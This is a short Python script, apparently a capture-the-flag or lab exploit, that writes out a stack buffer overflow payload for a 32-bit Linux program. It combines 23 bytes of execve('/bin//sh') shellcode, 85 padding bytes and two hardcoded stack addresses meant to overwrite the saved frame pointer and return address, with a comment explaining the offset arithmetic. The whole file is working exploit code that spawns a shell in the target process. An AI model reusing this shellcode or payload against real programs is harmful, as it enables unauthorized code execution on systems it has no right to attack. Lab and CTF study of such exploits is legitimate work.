from struct import pack
import sys
shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

# this shellcode is 23 bytes long, and the frame buffer is 108 bytes away, so
# we need to offset by 108 - 23 = 85
payload = shellcode + b'\x11' * 85 + pack("<I", 0xbffeeb98) + pack("<I", 0xbffeeb0c)
sys.stdout.buffer.write(payload)

